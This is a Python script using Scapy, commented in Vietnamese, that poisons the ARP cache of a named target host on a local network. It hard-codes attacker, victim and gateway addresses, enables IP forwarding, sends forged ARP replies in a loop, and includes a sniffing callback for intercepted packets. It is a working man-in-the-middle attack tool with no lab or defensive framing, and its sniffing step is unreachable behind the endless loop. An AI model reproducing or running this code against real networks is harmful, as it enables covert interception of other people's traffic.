from scapy.all import *
import time
import sys
import os

# Địa chỉ MAC và IP của máy nguồn, máy đích, và gateway
SRC_MAC = "E0:2B:E9:94:F2:D7"  # Địa chỉ MAC của máy nguồn
DST_MAC = "d4:d8:53:59:72:66"  # Địa chỉ MAC của máy đích f4:26:79:d7:a1:45 (Nga ) trân d4:d8:53:59:72:66
DST_IP = "192.168.175.48"         # Địa chỉ IP của máy đích
GATEWAY_IP = "192.168.175.1"      # Địa chỉ IP của gateway (router)

# ARP Spoofing - Gửi gói ARP giả mạo
def arp_spoof(target_ip, target_mac, gateway_ip):
    """
    Hàm gửi gói ARP giả mạo đến máy đích với địa chỉ MAC giả mạo của gateway.
    """
    # Tạo gói ARP giả mạo, giả mạo máy nguồn (psrc=gateway_ip) gửi đến máy đích (pdst=target_ip)
    arp_response = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=SRC_MAC)
    
    # Gửi gói ARP giả mạo
    send(arp_response, verbose=False)
    print(f"ARP Spoofing: Gửi gói ARP giả mạo tới {target_ip} với địa chỉ MAC {gateway_ip} giả mạo.")

# Chuyển tiếp gói tin - IP Forwarding
def forward_packet(packet):
    """
    Chuyển tiếp các gói tin nhận được từ máy đích ra ngoài.
    """
    if IP in packet:  # Kiểm tra xem gói tin có chứa IP không
        # Chuyển tiếp gói tin đến gateway hoặc ra ngoài
        print(f"Chuyển tiếp gói tin đến {GATEWAY_IP}: {packet.summary()}")
        send(packet, verbose=False)  # Gửi lại gói tin

# Gửi gói tin ARP Spoofing liên tục
def arp_spoof_continuously():
    """
    Gửi gói ARP giả mạo liên tục để duy trì trạng thái ARP spoofing.
    """
    while True:
        arp_spoof(DST_IP, DST_MAC, GATEWAY_IP)  # Gửi gói ARP Spoofing tới máy đích
        time.sleep(0.5)  # Gửi gói ARP mỗi 2 giây để duy trì kết nối giả mạo

# Hàm đọc và hiển thị gói tin
def packet_callback(packet):
    """
    Hàm này sẽ được gọi mỗi khi có một gói tin đến.
    """
    print(f"Gói tin nhận được: {packet.summary()}")
    # Kiểm tra xem gói tin có phải là gói IP không
    if IP in packet:
        forward_packet(packet)  # Chuyển tiếp gói tin nếu là gói IP

# Gửi gói tin ARP Spoofing tới máy đích
if __name__ == "__main__":
    # Bật tính năng IP forwarding trên hệ thống
    os.system("sysctl -w net.ipv4.ip_forward=1")  # Linux command to enable IP forwarding
    
    # Bắt đầu gửi gói ARP Spoofing liên tục
    print("Bắt đầu ARP Spoofing...")
    arp_spoof_continuously()

    # Bắt đầu bắt gói tin và gọi callback function khi có gói tin đến
    print("Đang bắt gói tin...")
    sniff(prn=packet_callback, store=0)  # Bắt gói tin và gọi hàm packet_callback khi có gói tin đến
